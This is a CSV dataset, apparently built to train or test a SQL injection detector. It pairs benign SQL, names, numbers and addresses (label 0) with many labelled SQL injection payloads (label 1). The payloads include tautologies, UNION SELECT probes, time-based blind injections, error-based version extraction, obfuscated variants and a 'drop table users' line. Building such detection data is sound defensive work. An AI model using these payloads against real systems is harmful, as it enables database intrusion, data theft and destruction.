Query,Label,cluster,stratify_col
"@var.selectÃ¢Â @var/**/as&var/*|rn*/into/*n';^*/temp end+     &&   ? ;(select!(select (select (select 5301)))) like 0o0b0o1x0x0b0o87771Ã¢Â and<0b1110251111011/*uzkcu*/not-like (select[(select 7291)) or,false  or  2068<>(select_2068) and true or false --",1,2,1_2
%u0027/*!12345*/and%u00201>=1%u0020--%u0020,1,0,1_0
"1""   )    )    as tybm where 2687  =  2687 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,4,1_4
barcario,0,8,0_8
select count ( my ) from wheel,0,1,0_1
"   select employees.shine, count ( orders.scaleid )  as bringfrom    ( ordersinner join chair on orders.begunid  =  employees.personid ) ",0,1,0_1
"llosa de ranes, la",0,0,0_0
select * from numeral where    not easier = 'buffalo',0,5,0_5
select case when 8867  =  7630 then 1 else null end--,1,6,1_6
"1""  )   where 2367  =  2367",1,6,1_6
select * from  ( select wild from deeply ) ,0,7,0_7
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt'  =  'qipt",1,1,1_1
"select   ( _case$when  ~(  0o0b110100041100  like  0b11b0b10001001010110011010101011100100100111111  )?! then{(select
8xd70) else 0o0x0x0x0b1/& ( %select (select%0x4)  )~ _end  ){Ã¢Â orfalse or false   or > false or false or false --",1,2,1_2
1' where 2958  =  2958,1,6,1_6
"1""  )   as ymsc where 3694  =  3694 waitfor delay '0:0:5'--",1,0,1_0
alicanto,0,8,0_8
zarlenga,0,8,0_8
henry,0,8,0_8
"1'+  (  select sfuq where 8094  =  8094 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   +'",1,9,1_9
select sleep  (  5  )  -- waln,1,4,1_4
correnta,0,8,0_8
"'/**/union/**/select/**/null,/**/null,/**/null/**/--/**/",1,0,1_0
"   select appropriate, individual+ ', ' + already+ ' ' + movie+ ', ' + wheat as together  from nobody",0,5,0_5
"1%u0027%u0020and%u0020substring(database(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020 or 'b'='b'--",1,2,1_2
atilio,0,8,0_8
select * from breeze fetch first 3 rows only,0,0,0_0
select * from until where birds not like 'push%',0,7,0_7
select safe,0,7,0_7
"'/*!12345*/union select 1,2,3--",1,4,1_4
"' a/*!12345*/nd extractvalue(1,concat(0x5c,version()))--#emkyollb",1,0,1_0
"1' xor substring(database(), 1, 1) = 's' --",1,9,1_9
32,0,3,0_3
; drop table users; --#utgc0,1,0,1_0
select * from colony  where cook = everybody,0,5,0_5
"1' union all select null,null,null,null,null,null#",1,4,1_4
mariana,0,8,0_8
"0o1%' ;)}  )  /  )&  or elt  (  5x0o0x20f6  like/**/ 0x2b0x0o0o0x5fb,sleep  (  0x9   )   )  	 ; &&   (select 0x0x1)  and  0x1 or false   && | true and true and true or false or@(select (select (select (select 0x0)))) and (select (select (select 1)))#d54!d",1,4,1_4
"0b0o1	union_all	select*null,null,null,null,null,null,nullor""3b6b0o0b0x0b100001100110100114111o8!or`0o0b1090x0x0o0*and	true and!9300 not[like]9601=[||  false[{and ;true'or}0x21e4<>(select](select/**/8676))or false#t]31",1,4,1_4
select min ( ran )  as beneath from wing,0,1,0_1
test' or '1'='1' /*--awb2qgyyf6w,1,9,1_9
"1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and 'rupq'  =  'rupq",1,9,1_9
"1'   )    )    as nuku where 7009  =  7009 union all select null,null,null,null,null#",1,4,1_4
"select 'supplier', contactname, city, country from suppliers;",0,1,0_1
"   select count ( printed ) , zoo from struggle by dish",0,1,0_1
antero,0,8,0_8
delete from charge,0,7,0_7
select * from dark fetch first 50 percent rows only,0,0,0_0
1'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'nfix'  =  'nfix,1,9,1_9
ombra,0,8,0_8
"1'+;?( ?select}'zirh'@where,0x295e ({/*)ldtod&Ã¢Â */ like ;;  2x2054 and;0b0xef0/-=_<benchmark/ (}?0o6x0o4c9b5x66b0b0b101305,md0x5%>(* 0x0o0b0x2b0b0x0o443214072<<;)
  /*ki^&*/)Ã¢Â }<^{) +'",1,9,1_9
 )    )    or sleep  (  __time__  )    =  ',1,2,1_2
plza. taboada chivite 32 5?b,0,0,0_0
"1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  'qutm'  =  'qutm",1,9,1_9
"0o0b4o3x0o1""",1,2,1_2
c63en13759,0,8,0_8
"%u0027%u0020union%u0020select%u00201,2,3 xor 'b'='b'--",1,2,1_2
giovannina,0,8,0_8
"0o5o0o0b0o0b0o3x0o0x2""->)!&   or  {false>or:(select)0x20cc)]not>like 2x22cc /and;&0xf0c&like
0xf0b5c@and true)and ""g[ ~""<>""g[|~$"" and ""b""=""b""&or+false!or falseand true and true or (select 0x0) or (select (select 0)) or ""2c"" not like ""2c""  &&? true?or false#) ;<{unionall\select""null,null,null,null,null,null,null--ps;0o14ep;]ghgw ",1,2,1_2
longhurst-street1@drae2.pa,0,0,0_0
"1'+  (  select 'tzyz' where 4912  =  4912 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,4,1_4
"0b1""~)/*wl{e($*/ where$0b0b10000000001100101001110110100010110000011/= (select/*o.*/0x1785) waitfor/**/delay '0:(select (select'(select 0b0o0))):5'--",1,0,1_0
"' and 1=convert(int,@@version)--",1,6,1_6
0o4'`. )/*y5?hvk`i(Ã¢Â (ew blk*/ : )     ) ; rlike   ( ;select ! (  case when Ã¢Â  (; 0o0x3fd0=(select`(select 0x0b10010191511111)): )[  then 0x5 else 0x2b0b0x0x3a end   )    )    and[   (    (* !  ( ;'okoj'='okoj,1,9,1_9
"1""   )    )    as azak where 4911  =  4911",1,6,1_6
"0b0o0o0x1x9c""/*yuebe6*/union[all;or}falseand'a' like`'a':;or/	falseandtrue or ""8;"" not;= ""8;""/**/ or  false or false or false#select/*g()a;*/null,null,null,null--g$^>_",1,0,1_0
5150,0,3,0_3
1/**/anD 1=1 -- random_noise,1,6,1_6
select * from  ( select together from here ) ,0,7,0_7
"'and
1=convert(int,@@version)--",1,6,1_6
"1'  ;)    )     )   and/*|:(select (select (select (select 0x4))))e6gtozl;w9=fzdei)j42*/0o0x0o0o7xeaa  like    (<|select upper  (  xmltype: (  chr  (  (select (select (select 8x3c))){ )  ||chr  (  6x7o3a  )     or   chr  ( }(select (select 0x71))[
)"", or chr  ( ~(select 0x0x71) *)   or chr_Ã¢Â ( +(select 0xb0o6)  )  ||chr  (  0o247  )    or  chr  (  (select=(select (select (select 0b1101110))))  ) :||  (* select/**/, (  case when   (  0xf17=0xeaa ?)   then 0x2 else (select 8b0) end! )   from^dual
 )   or chr ]( ~(select 0b101b7x0x10eff2)  )  ||chr _( \0o0x0o0xfa  )  ||chr  (  (select 5xd2)  )  ||chr  (  (select](select 0xde))  )  ||chr  (  (select (select (select (select (select (select (select (select 116))))))))  )  ||chr  ({ 9x7x0b11e  \) )  )     )   from~dual_ ) and  (   ]( /   (` 'jzpb'  like `'jzpb",1,9,1_9
hernani,0,8,0_8
select nearest ( s )  from cage select eight ( s ) ,0,1,0_1
"0o5x0x0x0b0b0b0o2b3o0x0o54cx1""_ )"" 	 )  ; ])! Ã¢Â union`allÃ¢Â selectnull,null,null,null,null,null,null,null]  or  <false`or ""zi""<>""zi"" || false;and*trueor_(select 8xd49).not_like 0xd49Ã¢Â or:false{andÃ¢Â 0x1`and true or false or+false and+(select (select 1))#] r`<_n",1,2,1_2
"insert into line ( center, soap, came, farther, bread, pot )  values  ( 'night', 'moment'. any', 'pile', 'desk', 'baby', 'does' )  ",0,1,0_1
"0b1""? )   as/bpmk)where (select.(select (select (select (select (select 6418)))))) /=>+9b0x0xbec[union/all
select null,null,null,null and.0x31}not like (select (select 0x82)) || false#se",1,4,1_4
" select * from users where id  =  1.%@ union select 1,version  (    )   -- 1",1,4,1_4
select * from customers  order by country,0,7,0_7
"1""   )    )    as paep where 8947  =  8947 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,4,1_4
select particular ( s )  from smoke select whatever from tried,0,1,0_1
1'   )    )    as dckd where 1794  =  1794,1,6,1_6
"9'+= ( ?select 'sppw' where 2b0o2b0b110101011100011101000111100100101100001111001110011000111111001010101100001110001000000101010101001101101001001000000011$=/**/0x0o6x13d3   &&~   exp  (, ~  (  select *	from,  (  select/concat^,(  0b0x0o13267185a0b0x0b110000,?!( ^select?  (  elt  (/ (select/*?(select 0x6)[>xjcnp:hyhx*/(select*(selectÃ¢Â (select 0x0b1ffe))))\  %    like       /0x1ffe,0x4x0b0b1110110<*>)~  _)     )Ã¢Â ,0o0b1011x0x2cda0b0b511100010001000111810011000111a21,0x78   ) 	 ]) x   )    )     )~ +'",1,9,1_9
select top ( s )  from wonder,0,1,0_1
70132648j,0,3,0_3
"0x9x1%"" unionall~select
null and (select 7)<and (select (select 1))#ovx",1,4,1_4
"1""  )   as semi where 4260  =  4260",1,6,1_6
44368,0,3,0_3
"1""   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,4,1_4
"-1235""   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""ahhz"" like ""ahhz",1,4,1_4
select option_value from wp_options where option_name  =  'options_contact_email' limit 1,0,5,0_5
"1"" ; )-   )   	 )  
 and  0b0x104c like (select(select (select{(select (select 0b0o0b1110801001101)))))*and    ( ?  (
 `  ( +""tuom""  like  ""tuom",1,4,1_4
select * from courage  where grow not like '[thought]%',0,7,0_7
"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1,1,1_1
"  select garage,worse,it from breath left join orders on needs.lotid =  wagon.characteristic order by mouse.spent",0,1,0_1
; dRop taBle users; --,1,0,1_0
" select * from users where;id = '7o1'  or &  (  \.> )  =(select (select 0o0o7b6))'union'select (select (select (select (select 1)))),@@version or "","" like "",*""Ã¢Â and ',<h '=',<h=' --?0x2':",1,4,1_4
select * from me fetch first 3 rows only,0,0,0_0
"-8773%'   )    )     )   union all select 8941,8941,8941,8941,8941,8941#",1,4,1_4
' or exists(select 1 from users)--,1,4,1_4
8167,0,3,0_3
"4'*>)	\.as/*3kd}*5ma*/scnnwhere0o0o0b1010o0b8x247a)=""9834",1,2,1_2
kussauer_brereton@showcarsmadrid.com.kp,0,0,0_0
"  update frighten set sort =  'being', city =  'word' where taste =  wing",0,5,0_5
"1""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1_1
select guide ( s )  from baseball select war ( s ) ,0,1,0_1
test' or '1'like'1' /*--r8iozp,1,9,1_9
borrenes,0,8,0_8
"1)) union select 1,database(),3 or 'b'='b'--#ghnxr",1,4,1_4
"0x1"", ) @~where 8b0b0b0x84e  like  0o0x64e or extractvalue  (  (select 0x4fd),concat (  0o8x5c,0x7671606a75,  (  select   (  elt 
([ 7x511/*sp.b|l<8sav&)(select (select (select (select 1))))>a*/ like  0x0b111171111,(select 0b1)  `).   )    <)!?,0o0x0x0o2cda767a71| [)    )  Ã¢Â  &&  true  or ""8(""  not like  ""8(""  or  "",d;""/not like "",d;"" orfalse, or  false or`false or false-and (select (select (select (select 0x5b0)))) not  like  0x593  or  ""ya""  not like :""ya"" or ""0""=""2>""`--",1,4,1_4
 and 1  =  utl_inaddr.get_host_address   (    (   select count  (  distinct  (  username   )    )    from sys.all_users   )    )    and 'i'  =  'i,1,1,1_1
select * from identity where influence = 'taste'  and city = 'five',0,5,0_5
select * from stage where silk = 'swimming'  and  ( struggle = 'smell' or taught = 'ground' ) ,0,5,0_5
select * from willing,0,5,0_5
select * from proud where price = 'luck' limit 3,0,5,0_5
"1' xor if(substring(database(), 1, 1)='a', sleep(5), 0) ----ln0smu",1,9,1_9
select * from whale where job = 'loose',0,5,0_5
select * from oil where somehow not like 'disappear%',0,7,0_7
"0b0b0o0b0x0o0o5x4';=).  or<(select (select 8x4o0b0o1b201111101100000100000010101b))\	 like  <[(! select count  ( /* [);  fromsysibm.systables~as?t0b3o0,sysibm.systables[as+t8,sysibm.systables&as?t0b0b1107101  )     
 and~      (] 'lfhx' like	'lfhx",1,9,1_9
"1and
1=1/*
*/",1,6,1_6
"1%'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  '%'  =  '",1,9,1_9
6120,0,3,0_3
"2b0b0x0o0o0x5""&
$)= ).    )>  union all select null,null,null,nullor/*fgao7*/false  and )0b0o156b0b0b1011111000101111111111011011001010011101100110011011011001101001110110001001010001011111011111000010101111100101111011011111110100|not  like  0xeb5||'$?t'!='$?t') ||  (select 0x6c4) not in ((select (select 1731)),(select (select 1732)),0x6c5) or)false and ""zs"" like ""zs""#`z;",1,4,1_4
"1'||  (  select 'cjwp' where 8681  =  8681 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  ||'",1,9,1_9
"1""   )    )     )   order by 1--",1,4,1_4
caruth5@wave.com.pt,0,0,0_0
" select>* from users where id Ã¢Â =: 0b2x1	or	"".;"" or (select (select (select 1)))  =  (select (select 0x5o4))  && Ã¢Â '?'>' not like '?'>}' and true --]1",1,2,1_2
rosenblatt@hormigon-impreso.az,0,0,0_0
72219452g,0,3,0_3
select sleep  (  5  )   and   (  'pwpc'  =  'pwpc,1,4,1_4
"   select employees.broken, count ( orders.populationid )  as actfrom    ( ordersinner join mood on orders.locateid  =  employees.dutyid ) ",0,1,0_1
"test'or
'1'='1'--",1,9,1_9
select avg ( task ) from evening select sum ( heart ) ,0,1,0_1
select sleep  (  5  )   and   (  'dcys' like 'dcys,1,4,1_4
"1o0x1'*Ã¢Â  )    )    or (select (select (select 3x8081)))  like?   (~ select count 	([ *  )   from generate_series
 (  0x0b0b0b1111101000,0x4c0x9b0o0b3x84   )   &) ; ;and !*
(    (;| 'qgov'='qgov+",1,9,1_9
a6ordab07,0,8,0_8
select * from unhappy fetch first 50 percent rows only,0,0,0_0
select avg ( price ) from potatoes,0,1,0_1
1 where 4844  =  4844,1,6,1_6
benalup-casas viejas,0,0,0_0
select * from captured fetch first 50 percent rows onlyselect top 3 * from arrange,0,0,0_0
1%u0027&&,1,2,1_2
"'orexists(sel/*!*/ect1/*
*/fromusers)----9dn3k",1,0,1_0
"-9456%""   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""%""  =  """,1,4,1_4
'/**/or/**/exists(select/**/1/**/from/**/users) and 'a'='a'--#wghnbph,1,9,1_9
"3"" 
) ?;where.(select@3b0o2610) like\(select 0o2610) unionÃ¢Â all:select/**/null,null,null orfalse and true and
0xaff like[(select (select 2869))#&_eqv\ka(",1,2,1_2
" select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",1,6,1_6
waitfor delay '0:0:5'# ogzq,1,0,1_0
'orexists(select,1,2,1_2
"c/ academia, 59, 3?g",0,0,0_0
16452,0,3,0_3
1  )   where 7552  =  7552 order by 1#,1,6,1_6
"selecttable_name,null,nullfrominformation_schema.tables",1,1,1_1
22115972t,0,3,0_3
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""ejmj"" like ""ejmj",1,4,1_4
"1%u0027/**/union/**/select/**/table_name,/**/null,/**/null/**/from/**/information_schema.tables/**/%u0020and%u0020%u0027a%u0027=%u0027a%u0027--",1,0,1_0
select avg ( immediately )  from basic  select sum ( her ) ,0,1,0_1
"'          union          select          null,          null,          null                    xor          'a'	= 'a'--     ",1,9,1_9
"7""/{)*_>where]3507	=/**/0b110110110011",1,2,1_2
91704360w,0,3,0_3
teosa,0,8,0_8
1%'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',1,9,1_9
"1'+ /* !k*/(
<select}kfmvwhere/*ig~k.*/0o3215^= ?0o0b110010010001",1,2,1_2
nullfrominformation_schema.tables or (1)--,1,4,1_4
"1""   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""wute"" like ""wute",1,4,1_4
~(or<'0o0b0b1111111100'_=Ã¢Â '0b150b11o7'--,1,2,1_2
select dollar,0,7,0_7
1'+  (  select 'wyed' where 9896  =  9896,1,6,1_6
"waitfordelay
'0:0:5'--/*
*/",1,0,1_0
"   select count ( minute ) , office from mass by alive",0,1,0_1
"1))/*!12345*/union%u0020select%u00201,database(),3--",1,0,1_0
renoir@cocheacoche.fk,0,0,0_0
'     xor     1  =	1          and     'a'  =	'a'--,1,9,1_9
"0o4'=Ã¢Â +)    )   
])   and (select 7o21674)  =^ like: ( 'abcdefg',upperÃ¢Â \( ~hex/*gd.ke*/ (  randomblob  (  (select0x0x5e0xca5b0)/0b2o4o0x8xc  |) 	  )   =)    ),  or^(select (select (select (select (select (select (select 0)))))))   or   false and true and true --",1,4,1_4
select * from fifteen where rice between '1996-07-01' and '1996-07-31',0,5,0_5
select * from trap,0,5,0_5
select * from experiment where height = 'other'  and city = 'red',0,5,0_5
select * from  ( select gently from experiment ) ,0,7,0_7
1'   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  'ujds'  =  'ujds,1,9,1_9
select * from thus,0,5,0_5
" (/*!k or (select (select (select	(select 0))))   and   true  or  ""]~"" not like ""]~"" or ""*{b	"" <> ""*{b	"" or false or false or false#:t<0b0x2*/ select * from   ( select  (  sleep> (  2b0b0b0b43   )   ]):    )` srmq| )  $and ""wsmz"" like ""wsmzdakreco)0x6:",1,2,1_2
select * from poetry 3 select * from indicate,0,5,0_5
12480,0,3,0_3
malditamente,0,8,0_8
7680000000000000,0,3,0_3
select distinct name from dance,0,7,0_7
"1'/*!12345*/or if(substring(database(), 1, 1)='a', sleep(5), 0) --#8hd9cgag",1,9,1_9
"waitfordelay
'0:0:5'----2wkz1441io6
",1,0,1_0
8776,0,3,0_3
"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",1,4,1_4
1860000000000000,0,3,0_3
minardi cardea,0,8,0_8
admin' or '1'='1,1,9,1_9
test'					or					'1'/**//**/=	'1'					/*,1,9,1_9
test' or/*!*/'1'='1' /* -- random_noise,1,9,1_9
select min ( highest )  as spread from require,0,1,0_1
"2x1""{where	0x4b0x5d
)=/**(select 0o2)$q*/ 0o0b11010011111101",1,0,1_0
1is4r1o,0,3,0_3
1'+  (  select 'sbji' where 7989  =  7989 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',1,9,1_9
97228883v,0,3,0_3
t45o0a35,0,8,0_8
"0b0b0o1763'
rlike sleep}
(  (select (select 0o0b101)) ])  .and	'cugs'  like;-'cugs",1,9,1_9
%u0027%u0020or%u00201>=1%u0020--%u0020,1,2,1_2
"6 andascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'( )  , (select (select 1)), 8]  )    )?    )  >> 116",1,4,1_4
"-2276""   )    )    as qwow where 2321  =  2321 or 3534  =  2971--",1,6,1_6
911358000000000,0,3,0_3
"'unionselectnull,null,null--
",1,4,1_4
"=|andÃ¢Â {0b0b0b6o283b4b0o0b0b0o8x0o0x0b110o6b111=utl_inaddr.get_host_address ?\(_|  (  \select{count  ( *distinct{ (  column_name
  )  ; ) ; )from(sys.all_tab_columns{ /*\c
(select""3)vmjo{w
*/)
 *>)&. ?and@'i'< like  'i",1,2,1_2
komarov@docerosas.dk,0,0,0_0
"'select~* from(users where/*0b111r*/id!~like	]0o8b5b7o0b0o49140734o1<*\Ã¢Â union:select null,@@version   &&  <true or'false --	1bk9z
",1,0,1_0
"calle can bordoi, 148",0,0,0_0
select * from truth 3,0,5,0_5
"1,  (  case when 8260  =  8260 then 1 else null end  )  ",1,6,1_6
select * from climate 3,0,5,0_5
%u0027/**/o/*!*/r/**/1=1/**/--/**/,1,0,1_0
waitfo/**/r/**/delay/**/'0:0:5'--#ryl7l4xbikjdx,1,0,1_0
'    and    1> = 1        or    (1)--    --h3epsqr1h,1,6,1_6
1'  )   rlike   (  select   (  case when   (  2721  =  8716  )   then 1 else 0x28 end   )    )    and   (  'dumt'  =  'dumt,1,9,1_9
"1'+-+(
 select!qtyi whereÃ¢Â 0b1101111101011=7147",1,2,1_2
"0'||  (<*select 'xpjg'""where(select 0xbdc) like 0o3o0x7666 and elt  (	(select 0x728)  like  (select 0x1a1c),(select (select (select (select 0x179c)))) Ã¢Â  )?   )    or '",1,9,1_9
"0b6000""<])   where\0x8x0o0x0o0x0b1101e1-/*:hlk*/=/*yz0t|acy	uvha>*/=0o2o0x0o0b10111e0b3000	or/*u)eu(mljl.*/0o9b0o0xa4x31</**/]like   dbms_pipe.receive_message ?(^.chr) (Ã¢Â /0b0b0x0o0o0b0x9b0b11110110100110111110[))`  /**/or` chr}<( `99_.)/*i?)bmz*/ ;`or<*chr|
(@""0x5x0o0o73*})>;  or }chr}>(^-0o2b0x0x8x0x0o0b0x0x43$=)@,0x8o0x5	+)@  ;  \  && !{   
  5b9b0b2o0x5x0o0x0b00101aa0x5o0b1010530001010b0x0o0b0x0b0b101b6o0o0xde not:like>8x0x0x6x2027/and?true or '='}like	'=[''or_false and\true and]true and(true and<1x12fd<>(select!0x12fe)^or?8x1ff8<>0x1ff8}--",1,2,1_2
"1"" where 3227  =  3227 waitfor delay '0:0:5'--",1,0,1_0
 :orÃ¢Â `,1,2,1_2
"0x3b5o5%""[rlikeÃ¢Â sleep
/*asof~*/(, (select
0b0o4o2x5x0o0o0o6o0b0x0x0b1001x5b101)])]Ã¢Â ""and:""%"">@<~like`.]/""",1,2,1_2
"1%"":
)   or char `($ 0x72  )/*ohzy+|ow  ;p]*/  or char (] 0o9b0o345  )(  or char 	( _0b1105011> )]: or char  (  (select (select (select (select (select (select (select (select 128))))))))  )  &)=  regexp_substring ,( 	repeat  (  right	 (  char  (  (select 0x0o5a0x1)  )/*ddz(9;^@2hfgni2zea{w*/ ,3o0x0b6  ) /,(select 0o0b9x12a5f200)  )  ,null  )  or ""swb"" <>,""swb""  &&  true or ""["" not = ""["" or false or ""u]"" not like ""u	"" and true and ""`i""   like   ""`i"" or false and true and 0x1 or false or (select (select (select 0))) or 0x20a4<>0x20a4 and "";.j""<>"";.jd"" and true and (select 1) or false --",1,4,1_4
"-5292'  )   union all select 1439,1439,1439,1439#",1,4,1_4
"1""where^(select!0b0b1001010100101001000111100011209100): =/**/ 1166",1,2,1_2
select top 3 * from command,0,5,0_5
1' and   (  3020  =  3020  )  *6703 and 'qsrz'  =  'qsrz,1,9,1_9
"8{where 0b0o6x1c0b100110?~like  (select (select 0x2418))  or Ã¢Â 0o0o0b0b10100001101011000000001100110001011011010111<<like>~like'	(  'abcdefg',upper  (  hex
`(  r  && 
omblob  (  (select 0b11110000110011011007001000000)/0b0b1010""_ )~   ) +  Ã¢Â  )    ),  or 0b0)or ';n' like ';nt'/*`oe+0x0b1001ww0x7x c^(select (select 0x3))jv0b101w?!(select (select (select (select (select 2)))))
h!^f*/--",1,2,1_2
" and (select (select (select (select (select (select 0b11x0o2))))))  like  utl_inaddr.get_host_address   (    ( _ select distinct  or false or ""m""!=""m"" or false or (select 0x74c) not like (select 1868)#(  column_name  )   from   (` select	distinct	 (  column_name/~""5e*  )  , rownum'as limit from all_tab_columns  ) $ where@limit=2b0b0x0o21ax0o0o0b105b1 or ""z>"" not like ""z>""#  )>   )<   and 'i'  like  'i'$&z`;:",1,4,1_4
1'||  (  select 'tfqg' from dual where 9862  =  9862 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,4,1_4
3'^ or   /**/(. select 'adoe'?from dual where(select~(select 7962))  =  0x1dee,1,2,1_2
9530,0,3,0_3
select being from call union select himself from taken order by income,0,7,0_7
"8b8o1""^ )~  rlike[sleep{
( ]5x0x0b8x0o0x0x0b0x0o0x0b1001b6o8b0b0b1010110101111001011010100001010001010001111100000111001011010100101/**/ ) <       &&  ,  =-/**/ (  ""efoq""like?""efoq",1,2,1_2
%u0027%u0020and%u00201=1%u0020--%u0020--skip58wst0ym,1,2,1_2
1'||  (  select 'miew' where 8360  =  8360 waitfor delay '0:0:5'  )  ||',1,9,1_9
select * from course 3 select * from press,0,5,0_5
"1   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   4686  =  4686",1,4,1_4
select * from  ( select plant from breakfast ) ,0,7,0_7
"1)) union select 1,database(),3----l0o10axd7cs",1,4,1_4
"1 where 5627  =  5627 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,4,1_4
" select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",1,5,1_5
" select * from shine order by owner asc, soon desc",0,7,0_7
select count ( sillyid ) from tide,0,1,0_1
select avg ( provide ) from opposite,0,1,0_1
select * from managed where fish = 'pencil' limit 3,0,5,0_5
select * from lake where stuck = 'won',0,5,0_5
select * from rather where gather like '%heard%',0,7,0_7
8259770000000000,0,3,0_3
arganza,0,8,0_8
select distinct country from customers,0,7,0_7
select tight from tears,0,7,0_7
"subida san diego 8, 13?c",0,0,0_0
"8'_!*)   /*z 4o:[y.*/)  ( and	elt +(  0o0b4o9o0b0o0o3b0o0b8x0o4ba  like-(select.(select	(selectÃ¢Â 9x2x9x6o0b10o3aa))),sleep .((0x5 ; )  /;) Ã¢Â   and	.	%( <^	(	+Ã¢Â 'ogpg'='ogpg",1,9,1_9
select * from farm where herself  between 10 and 20,0,5,0_5
' or exists(select 1 from users) and 'a'='a'--,1,9,1_9
